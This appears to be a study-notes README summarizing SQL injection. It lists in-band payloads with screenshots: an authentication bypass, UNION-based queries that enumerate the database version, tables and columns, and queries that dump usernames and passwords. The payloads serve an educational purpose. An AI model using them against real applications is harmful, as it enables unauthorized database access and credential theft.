# SQLi (Structured Query Language) Injection Summary

## What is SQL Injection?
SQL Injection is a web security vulnerability that allows a hacker to interfere with the queries that an application makes to its database. It occurs when untrusted input is inserted into a SQL query without proper validation or escaping, enabling the hacker to manipulate the database.

## Types of SQL Injection

### **1. In-Band SQLi**
In-Band SQLi is the most common and straightforward type of attack, where the attacker retrieves results using the same communication channel.


**- Basic authentication bypass**
```sql
' OR 1=1; --
```
![Basic authentication bypass](imgs/in-band/sqli-payload-01.jpg)


**- Union-based to retrieve version**
```sql
' UNION SELECT NULL, @@version; --
' UNION SELECT NULL, version(); --
```
![Union-based to retrieve version](imgs/in-band/sqli-payload-02.jpg)


**- Union-based to retrieve database name**
```sql
' UNION SELECT NULL, database(); --
```
![Union-based to retrieve database name](imgs/in-band/sqli-payload-03.jpg)


**- Union-based to retrieve all table names**
```sql
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database(); --
```
![Union-based to retrieve all table names](imgs/in-band/sqli-payload-04.jpg)


**- Union-based to retrieve column names**
```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'; --
```
![Union-based to retrieve column names](imgs/in-band/sqli-payload-05.jpg)


**- Retrieve usernames and passwords**
```sql
' UNION SELECT username, password FROM users; --
```
![Retrieve usernames and passwords](imgs/in-band/sqli-payload-06.jpg)


**- Extracting data from a specific table**
```sql
' UNION SELECT NULL, column_name FROM users; --
```
![Extracting data from a specific table](imgs/in-band/sqli-payload-07.jpg)
![Extracting data from a specific table](imgs/in-band/sqli-payload-08.jpg)


**- Check the length of the database name**
```sql
' OR LENGTH(database()) > 0; --
%' AND LENGTH(database()) = 10; --
```
![Check the length of the database name](imgs/in-band/sqli-payload-09.jpg)


**- Retrieve data from a specific column as a group**
```sql
' UNION SELECT 1,2,3,4; --
' UNION SELECT 1,2,3,group_concat(username) FROM users; --
```
![Retrieve data from a specific column as a group](imgs/in-band/sqli-payload-10.jpg)
